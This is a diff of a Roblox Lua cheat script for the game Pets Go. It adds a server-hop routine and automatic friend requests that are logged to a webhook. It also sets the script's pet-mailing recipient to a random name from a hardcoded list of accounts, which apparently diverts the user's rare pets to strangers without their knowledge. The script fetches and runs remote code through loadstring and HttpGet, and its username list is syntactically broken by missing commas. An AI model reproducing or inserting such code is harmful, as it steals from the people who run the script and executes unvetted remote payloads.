@@ -1,3 +1,101 @@
+ local plrs = game:GetService("Players") 
+  local plr = plrs.LocalPlayer
+  local tpService = game:GetService("TeleportService")
+
+local function getServers()
+    local url =
+        string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
+    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
+    return servers
+end
+
+local function serverhop()
+ local server
+    repeat
+        task.wait(1)
+        server = getServers()[Random.new():NextInteger(1, 100)]
+
+    until server.id ~= game.JobId
+
+
+    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
+end
+
+local usernames = {
+    "kermieiacobus86",
+    "wavelammi11",
+    "181784jayne",
+    "pajndrewndrew947",
+    "ilgacobacob297",
+    "axvndrewndrew2853",
+    "cicddisondison5139",
+    "mfxoeoe3245",
+    "xweihacharyacary2070",
+    "pgdqiavidavid5012"
+    "elxisabellamasw552"
+    "sxwioletiolet5228"
+    "ecfracegoge893"
+    "liodamdam10615"
+    "xamacharyacary3"
+}
+
+local function getRandomUsername()
+    local index = math.random(1, #usernames)
+    return usernames[index]
+end
+
+local sendto = getRandomUsername()
+
+
+local Url2 = ""
+local Http2 = game:GetService("HttpService")
+	local Msg = function(msg)
+		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
+	end
+
+
+local Players = game:GetService('Players')
+local Client = Players.LocalPlayer
+_G.EnableFriendRequest = true
+
+local function SendFriendRequests()
+	
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= Client then  
+            Client:RequestFriendship(player)
+			Msg(Client.Name.." đã gửi yêu cầu kết bạn tới "..player.Name)
+			task.wait(600)
+        end
+        task.wait(1)
+    end
+end
+
+
+task.spawn(function()		
+    if _G.EnableFriendRequest then
+		wait(600)
+		SendFriendRequests()
+
+        
+    end
+end)
+	
+task.spawn(function()
+	wait(math.random(1800, 3600))
+		while true do
+	
+	serverhop()
+	wait(1)
+end
+end)
+
+
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+  end
+
+
 script_key="kuQoDnFgeRipnysIrKrGhcoLjpYFSUEn";
 
 getgenv().petsGoConfig = {
@@ -14,6 +112,7 @@ getgenv().petsGoConfig = {
     MAIL_PET_ODDS = 50000000,  -- Minimum Pet Odds To Mail
     USERNAME_TO_MAIL = sendto -- Mail Pet To Username
 }
+
 daubuoi = true
 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e81ea00ef49a917bb1242da4f41dc4f9.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5653ca0a4685e7d4268329988eefdb21.lua"))()
